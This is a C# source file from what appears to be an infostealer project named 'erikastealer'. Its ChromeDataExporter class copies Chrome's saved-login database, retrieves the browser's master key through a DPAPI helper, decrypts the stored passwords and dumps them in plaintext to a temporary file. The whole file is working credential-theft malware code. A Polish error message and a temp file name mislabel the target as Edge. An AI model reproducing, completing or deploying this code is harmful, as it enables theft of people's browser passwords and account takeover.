using erikastealer.Exporters;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Text.Json;
using System.Data.SQLite;
using System.Security.Cryptography;
using System.Linq;
using System.Xml.Linq;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using erikastealer.Helpers;

namespace erikastealer.Exporters
{
    public class ChromeDataExporter : IExporter
    {
        private static readonly string ChromeProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Default", "Login Data");
        private static readonly string ChromeLocalStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Local State");

        public string CreateBackup()
        {
            if (!File.Exists(ChromeProfilePath))
                throw new FileNotFoundException("Nie znaleziono bazy danych Edge", ChromeProfilePath);

            string tempDbPath = Path.Combine(Path.GetTempPath(), "EdgeLoginData.db");
            File.Copy(ChromeProfilePath, tempDbPath, true);


            byte[] masterKey = DPAPI.GetChromiumMasterKey(ChromeLocalStatePath);

            List<DPAPI.PasswordEntry> passwords = DPAPI.ExtractPasswords(tempDbPath, masterKey);

            string backupFile = Path.Combine(Path.GetTempPath(), "chrome_passwords.txt");
            File.WriteAllLines(backupFile, passwords.Select(x => x.ToString()).ToArray());

            File.Delete(tempDbPath);
            return backupFile;

        }

    }
}
